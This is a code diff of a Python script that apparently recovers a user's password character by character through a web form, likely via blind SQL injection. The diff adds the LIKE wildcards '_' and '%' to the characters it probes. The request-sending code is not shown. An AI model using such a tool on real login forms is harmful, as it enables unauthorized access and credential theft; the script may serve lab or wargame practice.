@@ -5,7 +5,7 @@
 # special = {|}~[\]^_`!"#$%&'()*+,-./:;<=>?@)
 # so use .join or """ i guess?
 # special = ''.join("{|}~[\]^`!#$&'()*+,-./:;<=>?@)") + '"'
-special = (" ".join("{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)") + '"').split()
+special = (" ".join("{|}~[\]^`!#$&'()*+,-./:;<=>?@)") + '"').split()
 lower = " ".join("abcdefghijklmnopqrstuvwxyz").split()
 upper = " ".join("ABCDEFGHIJKLMNOPQRSTUVWXYZ").split()
 numbers = " ".join("0123456789").split()
@@ -17,6 +17,7 @@ numbers = " ".join("0123456789").split()
 
 # https://stackoverflow.com/questions/28056843/special-characters-in-string-literals#28056873
 other = []
+wildcards = {"_", "%"}
 
 
 def assignCharacters(otherChars, where):
@@ -56,7 +57,7 @@ def assignCharacters(otherChars, where):
 
 
 
-def makeList(username, url, caseSensitive = False):
+def makeList(username, url, caseSensitive = False, wildCards = True):
    """checks for common characters in the password and returns the characters contained somewhere in the password string
 
    characters: a-z 0-9 "{|}~[\]^_`!#$%&'()*+,-./:;<=>?@)
@@ -69,6 +70,9 @@ def makeList(username, url, caseSensitive = False):
          url to form to check
       caseSensitive: boolean (optional)
          Set to true to check uppercase and lowercase versions of the characters
+      wildCards: boolean (optional)
+         default true
+         Set to false to disallow wildcards -- not currently recommended, may cause unexpected code failures
 
    Returns:
       charList:
@@ -102,6 +106,11 @@ def makeList(username, url, caseSensitive = False):
          if(checkPasswordCharacter(str(ch), username, url)):
             charList.append(str(ch))
             print(ch)
+   if(wildCards):
+      for ch in wildcards:
+         if(checkPasswordCharacter(str(ch), username, url)):
+            charList.append(str(ch))
+            print(ch)
    return charList
 
 
@@ -123,7 +132,9 @@ def checkPass(username, url, charList, n):
          i: integer
             prints i iff there is no character in charList that matches at position i. also raises type and value error after printing i -- printing is handled by findChar
          password: string
-            correct password or, if len(password) = n, first n characters of password    
+            correct password or, if len(password) = n, first n characters of password
+            if no characters match and wildcards are in the charList (wildCards is True), _ will be substituted in since it matches every single character.
+            otherwise, if no characters match, that character will be skipped, and it's index is printed (e.g. Missing: 6) 
 
       Raises:
          TypeError: exception
@@ -165,8 +176,10 @@ def findChar(username, url, charList, i):
             return ch
    #only runs if no ch in charList match:
    # return i #oof, there's no match if i is out of bounds, e.g. len(password) < i
-   print(i) #so I know when it's not a match
+   print("Missing: " + i) #so I know when it's not a match
    return "" #return an empty string instead
+   # Note to self: should not return an _ because it'll match an _ if wildCards are true (default). 
+   # If wildCards is false, this will just skip characters that don't match anything!
 
 """
    Strategy:
